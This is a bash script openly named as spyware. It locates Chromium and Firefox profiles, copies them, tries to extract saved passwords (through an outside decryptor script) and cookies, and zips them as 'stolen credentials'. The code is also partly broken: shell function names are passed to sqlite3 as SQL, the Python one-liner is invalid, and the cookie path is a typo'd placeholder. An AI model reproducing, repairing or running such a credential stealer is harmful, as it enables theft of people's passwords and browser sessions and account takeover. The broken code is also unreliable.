#!/bin/bash

# Variables
TARGET="/tmp/spyware"
CREDENTIALS=$(mktemp)

# Function to locate browser profile folders
locate_browser_profiles() {
    mkdir -p $TARGET/profiles
    CHROME_PROFILES=$(find ~/Library/Application\ Support/Chromium -name "Profile*" 2>/dev/null)
    CHROME_PROFILE_PATH=$(find $CHROME_PROFILES -name "Login Data" 2>/dev/null | head -1)
    
    if [[ -n "$CHROME_PROFILE_PATH" ]]; then
        cp -R $(dirname $CHROME_PROFILE_PATH)/* $TARGET/profiles/
    fi
    
    FIREFOX_PROFILES=$(find ~/.mozilla/firefox -name "default-release" 2>/dev/null)
    FIREFOX_PROFILE_PATH=$(find $FIREFOX_PROFILES -name "cookies.sqlite" 2>/dev/null | head -1)
    
    if [[ -n "$FIREFOX_PROFILE_PATH" ]]; then
        cp -R $(dirname $FIREFOX_PROFILE_PATH)/* $TARGET/profiles/
    fi
    
    # Add more browsers here as needed
}

# Function to open SQLite databases and extract credentials
open_sqlite_databases() {
    mkdir -p $TARGET/credentials
    
    if [[ -f "$CHROME_PROFILE_PATH/Login\ Data" ]]; then
        sqlite3 "$CHROME_PROFILE_PATH/Login\ Data" ".read ~/.bash_profile; decrypt_creds"
        cp "$CREDENTIALS" $TARGET/credentials/login_data.txt
    fi

    if [[ -f "$FIREFOX_PROFILE_PATH/cookies.sqlite" ]]; then
        sqlite3 "$FIREFOX_PROFILE_PATH/cookies.sqlite" ".read ~/.bash_profile; extract_cookies"
        cp "$CREDENTIALS" $TARGET/credentials/cookies.txt
    fi
    
    # Add more databases here as needed
}

# Function to decrypt saved passwords using local master key
decrypt_creds() {
    if [[ -f "$(dirname $CHROME_PROFILE_PATH)/Local\ State" ]]; then
        ./local_state_decryptor.py $(dirname $CHROME_PROFILE_PATH)/* > $CREDENTIALS
    fi
}

extract_cookies() {
    python3 -c 'import sqlite3; conn = sqlite3.connect("/path/to/cookis.sqlite"); cursor = conn.cursor(); cursor.execute("SELECT host_key, name, value FROM moz_cookies"); for row in cursor.fetchall(): print(row)'
}

# Function to compress stolen credentials into a JSON or ZIP file
package_credentials() {
    mkdir -p $TARGET/credentials

    zip -j $TARGET/credentials/credentials.zip $TARGET/profiles/* $TARGET/credentials/*
    
    # Add more files here as needed
}

# Main program flow
locate_browser_profiles
open_sqlite_databases
package_credentials
